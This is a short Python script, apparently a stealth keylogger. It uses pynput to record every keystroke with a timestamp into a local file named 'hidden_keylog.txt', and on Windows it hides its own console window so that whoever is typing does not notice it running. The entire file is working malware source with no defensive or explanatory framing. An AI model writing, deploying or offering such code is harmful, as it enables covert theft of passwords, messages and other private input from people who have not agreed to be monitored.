from pynput import keyboard
import logging
import os

# Hide Console Window (for Windows)
if os.name == "nt":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Configure Logging (Saves keystrokes to a file)
log_file = "hidden_keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(f"{key.char}")  # Normal keys
    except AttributeError:
        logging.info(f" [{key}] ")  # Special keys

# Start Keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
